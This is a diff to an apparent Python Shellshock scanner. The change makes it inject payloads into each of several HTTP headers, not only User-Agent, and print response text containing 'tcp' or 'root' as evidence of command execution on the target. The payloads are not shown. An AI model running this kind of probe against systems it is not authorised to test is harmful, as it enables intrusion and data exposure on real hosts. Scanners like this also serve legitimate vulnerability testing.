@@ -25,19 +25,20 @@ allClear = ' does not appear VULNERABLE.'
 ## for each payload, launch request to check for shellshock
 for each in payloads:
     query = o.scheme + '://' + o.netloc + o.path
-    results = requests.get(query, headers={'User-Agent':payloads[each]})
-    soup = BeautifulSoup(results.text)
-    match = str(soup.body.p)
-    if (len(match)!= 0) or match != 'None':
-        if 'tcp' in match:
-            print ('Host: ' + query + confirm)
-            print ('Payload: ' + payloads[each])
-            print(match[314:704])
-        elif 'root' in match:
-            print ('Host: ' + query + confirm)
-            print ('Payload: ' + payloads[each])
-            print(match[3:35])
+    for heads in http_headers:
+        results = requests.get(query, headers={heads:payloads[each]})
+        soup = BeautifulSoup(results.text)
+        match = str(soup.body.p)
+        if (len(match)!= 0) or match != 'None':
+            if 'tcp' in match:
+                print ('Host: ' + query + confirm)
+                print ('Payload: ' + payloads[each])
+                print(match[314:704])
+            elif 'root' in match:
+                print ('Host: ' + query + confirm)
+                print ('Payload: ' + payloads[each])
+                print(match[3:35])
+            else:
+                print(match)
         else:
-            print(match)
-    else:
-        print ('Host' + allClear)
+            print ('Host' + allClear)
